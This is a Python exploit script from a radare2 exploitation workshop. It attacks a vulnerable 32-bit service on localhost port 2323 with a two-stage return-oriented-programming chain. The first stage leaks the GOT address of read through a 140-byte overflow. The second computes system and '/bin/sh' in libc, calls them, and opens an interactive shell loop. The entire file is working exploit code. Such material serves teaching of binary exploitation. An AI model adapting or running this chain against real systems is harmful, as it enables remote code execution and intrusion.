import socket
import struct
import time
import sys

# radare2 exploitation workshop
# (losely based on work from Eindbazen and Crowell)

def rop(*args):
    return struct.pack('I'*len(args), *args)


readplt = 0x804832c
writeplt = 0x804830c
read_got = 0x0804961c
vuln_func = 0x080483F4
write_addr = 0x08049524  # where we're going to write
pop3ret = 0x080484b6

# vm glibc offsets
read_local = 0xd9d00
system_local = 0x3e2c0
exit_local = 0x310b0

# local glibc offsets
read_local =   0xdb1b0
system_local = 0x3e770
binsh_local =  0x1602c4

system_offset = read_local - system_local
binsh_offset = read_local - binsh_local

s = socket.create_connection(('127.0.0.1', 2323))

print('[+] Sending stage1 (leak)')
s.send('A'*140 + rop(
    writeplt,
    pop3ret,
    1,  # stdout
    read_got,
    4,  # size of a pointer

    # return to the vulnerable function
    vuln_func
))


# receive leaked address of read
leaked_got = struct.unpack('I', s.recv(4))[0]
print('[*] GOT at 0x%08x' % leaked_got)

# calculate address of system using the leaked offset
system = leaked_got - system_offset
print("[*] system(2) at 0x%08x" % system)

binsh = leaked_got - binsh_offset
print("[*] /bin/sh at 0x%08x" % binsh)

# second stage ROP payload
print('[+] Sending stage2 (call)')
s.send('A'*140 + rop(
    system,
    0x41414141,
    binsh
))

while(True):
    s.send(raw_input('$ ') + '\n')
    print(s.recv(1024))
